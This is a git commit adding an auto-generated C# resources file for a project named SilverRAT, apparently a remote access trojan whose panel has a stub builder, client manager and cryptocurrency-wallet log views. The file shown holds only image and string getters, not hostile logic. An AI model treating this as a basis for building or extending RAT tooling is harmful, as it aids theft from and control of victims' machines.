de7b44e48c08ca72cde347462e9a2550db7c281e
Jose6453289 <hjghfdsds@outlook.com>
2024-10-07 17:10:35 +0400

    Resources.cs

---
+++ SRC/Properties/Resources.cs
@@ -0,0 +1,747 @@
+using System.CodeDom.Compiler;
+using System.ComponentModel;
+using System.Diagnostics;
+using System.Drawing;
+using System.Globalization;
+using System.Resources;
+using System.Runtime.CompilerServices;
+
+namespace SilverRAT.Properties;
+
+[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
+[DebuggerNonUserCode]
+[CompilerGenerated]
+internal class Resources
+{
+    private static ResourceManager resourceMan;
+
+    private static CultureInfo resourceCulture;
+
+    [EditorBrowsable(EditorBrowsableState.Advanced)]
+    internal static ResourceManager ResourceManager
+    {
+        get
+        {
+            if (resourceMan == null)
+            {
+                ResourceManager resourceManager = new ResourceManager("SilverRAT.Properties.Resources", typeof(Resources).Assembly);
+                resourceMan = resourceManager;
+            }
+            return resourceMan;
+        }
+    }
+
+    [EditorBrowsable(EditorBrowsableState.Advanced)]
+    internal static CultureInfo Culture
+    {
+        get
+        {
+            return resourceCulture;
+        }
+        set
+        {
+            resourceCulture = value;
+        }
+    }
+
+    internal static Bitmap A
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("A", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap About1
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("About1", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap About2
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("About2", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap Admin
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("Admin", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap Alert
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("Alert", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap B
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("B", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap Builder1
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("Builder1", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap Builder2
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("Builder2", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap BuilderNothingIcon
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("BuilderNothingIcon", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap C
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("C", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap Clients1
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("Clients1", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap Clients2
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("Clients2", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap D
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("D", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap Dashboard1
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("Dashboard1", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap Dashboard2
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("Dashboard2", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap E
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("E", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap Empty
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("Empty", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap ErrorNotif
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("ErrorNotif", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap F
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("F", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap G
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("G", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap H
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("H", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap HidePass
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("HidePass", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap I
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("I", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap IconAdd
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("IconAdd", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap IconBaink
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("IconBaink", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap IconCreypto
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("IconCreypto", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap IconInfo
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("IconInfo", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap IconInstalled
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("IconInstalled", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap iconleft
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("iconleft", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap iconquestion24
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("iconquestion24", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap IconRight
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("IconRight", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap Bitmap_0
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("IconXClose", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap ImageIndex
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("ImageIndex", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap InfoNotif
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("InfoNotif", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap InfoProfile
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("InfoProfile", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap InfoSetting
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("InfoSetting", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap IocnPaypal
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("IocnPaypal", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap J
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("J", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap K
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("K", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap L
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("L", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap LogsBTC
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("LogsBTC", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap LogsETH
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("LogsETH", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap LogsLTC
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("LogsLTC", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap LogsLTC2
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("LogsLTC2", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap LogsMony
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("LogsMony", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap logsXMR
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("logsXMR", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap M
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("M", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap MabagerPC
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("MabagerPC", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap ManagerDesk
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("ManagerDesk", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap ManagerInfo1
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("ManagerInfo1", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap ManagerInfo2
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("ManagerInfo2", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap ManagerInstalled1
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("ManagerInstalled1", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap ManagerInstalled2
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("ManagerInstalled2", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap Monitor1
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("Monitor1", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap Monitor2
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("Monitor2", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap N
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("N", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap Notif1
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("Notif1", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap Notif2
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("Notif2", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap Bitmap_1
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("NotifTEST", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap O
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("O", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap P
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("P", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap Q
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("Q", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap R
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("R", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap S
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("S", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap SavedSettings
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("SavedSettings", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+
+
+    internal static Bitmap Settings1
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("Settings1", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap Settings2
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("Settings2", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap ShowPass
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("ShowPass", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static string StubAV => ResourceManager.GetString("StubAV", resourceCulture);
+
+    internal static Bitmap SuccessNotif
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("SuccessNotif", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap T
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("T", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap U
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("U", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap UpdateText
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("UpdateText", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap V
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("V", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap W
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("W", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap X
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("X", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap Y
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("Y", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal static Bitmap Z
+    {
+        get
+        {
+            object @object = ResourceManager.GetObject("Z", resourceCulture);
+            return (Bitmap)@object;
+        }
+    }
+
+    internal Resources()
+    {
+    }
+}
